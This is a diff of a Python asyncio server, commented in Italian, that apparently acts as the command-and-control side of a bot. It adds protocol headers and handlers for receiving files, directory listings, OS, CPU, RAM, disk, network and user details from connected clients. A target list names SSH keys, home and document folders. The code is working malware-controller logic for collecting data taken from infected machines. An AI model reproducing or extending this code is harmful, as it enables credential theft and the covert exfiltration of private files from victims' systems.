@@ -19,11 +19,17 @@ __response_options = {"1": "OS-TYPE", "2": "CPU-STATS", "3": "RAM", "4": "PARTIT
 
 # Definiamo degli header custom per identificare il tipo di dato ricevuto dal client
 # Per la gestione della ricezione dei file utilizziamo il seguente formato: <File-Name>NOME_FILE<File-Content>CONTENUTO_FILE
-__headers_type = {"1": b"<File-Name>", "2": b"<File-Content>", "3": b"<File-Not-Found>", "4": b"<OS-type>", "5": b"<CPU-stats>", "6": b"<Ram-usage>",
-                  "7": b"<Partition-disk-info>", "8": b"<Partition-disk-status>", "9": b"<IO-connected>", "10": b"<Network-info>", "11": b"<Users>",
-                  "12": b"<Content-Path>"}
+__headers_type = {"1": b"<File-Name>", "2": b"<File-Content>", "3": b"<File-Not-Found>",
+                  "4": b"<OS-type>",
+                  "5": b"<CPU-stats>", "5-1": b"<CPU-Brand>", "5-2": b"<CPU-Count>", "5-3": b"<CPU-Count-Logical>", "5-4": b"<CPU-Min-Freq>", "5-5": b"<CPU-Max-Freq>",
+                  "6": b"<Ram-usage>", "6-1": b"<Ram-Current-Usage>", "6-2": b"<Ram-Total>",
+                  "7": b"<Partition-disk-info>", "7-1": b"<Partition-Device>", "7-2": b"<Partition-MountPoint", "7-3": b"<Partition-FSType",
+                  "8": b"<Partition-disk-status>", "8-1": b"<Partition-disk-read-status>", "8-2": b"<Partition-disk-write-status>",
+                  "9": b"<Network-info>", "9-1": b"<Network-Interface>", "9-2": b"<Network-IP>", "9-3": b"<Network-NetMask>", "9-4": b"<Network-Broadcast>",
+                  "10": b"<Users>", "10-1": b"<Users-Name>", "10-2": b"<Users-Active-Since>",
+                  "11": b"<Content-Path>"}
 
-__filesystem_hierarchy_components = {"1": "Root", "2": "Home", "3": "SSH KEYS", "4": "Images", "5": "Documents"}
+__filesystem_hierarchy_components = {"1": "Root", "2": "Home", "3": "SSH KEYS", "4": "Images", "5": "Documents"}  # TODO: Probabile convenga modificare la Root con qualcosa di meno intensive
 
 __buffer_size = 8192
 
@@ -52,7 +58,8 @@ async def handle_bot_client(reader: asyncio.StreamReader, writer: asyncio.Stream
 
 async def handle_response(response: bytes, addr: str, port: int) -> None:
     """Funzione di gestione per la response (contenuto di file) ricevuta dal client."""
-    if response.startswith(__headers_type["1"]):
+    # Sarebbe stato preferibile utilizzare un case statement ma non è possibile utilizzando startswith
+    if response.startswith(__headers_type["1"]):  # Recupero file
         print("Ricezione di un file da parte del client:")
 
         # In questo modo otteniamo una stringa la response prima dell'header <File-Name> (eliminando il [1] otteniamo una lista con il primo elemento vuoto)
@@ -61,8 +68,15 @@ async def handle_response(response: bytes, addr: str, port: int) -> None:
         name_n_content = re.split(__headers_type["2"], delete_header)  # TODO: Assegnare a 2 variabili il contenuto della lista ottenuta da nome_n_content
 
         await handle_response_for_files(name_n_content[0], name_n_content[-1])  # La lista è composta da 2 elementi e per semplicità passiamo il primo e l'ultimo elemento in questo modo
-    elif response.startswith(__headers_type["3"]):
+
+    elif response.startswith(__headers_type["3"]):  # Caso in cui il file non sia presente sul FS
         print(f'Il file richiesto {re.split(__headers_type["3"], response)[1].decode()} al client è inesistente')  # Decoding del nome del file in place
+
+    elif response.startswith(__headers_type["4"]):  # Informazioni sul tipo di OS
+        print(f'OS-TYPE: {re.split(__headers_type["4"], response)[1].decode()}')  # Decoding del nome del file in place
+
+    elif response.startswith(__headers_type["11"]):  # Recupero contenuto di una directory -> Definite in __filesystem_hierarchy_components
+        print(f'File: {re.split(__headers_type["11"], response)[1].decode()}')  # Decoding del nome del file in place
     else:
         msg = response.decode()
         print(f"Messaggio da {addr}:{port}: {msg!r}")  # Sfruttiamo il Literal String Interpolation (F-String)
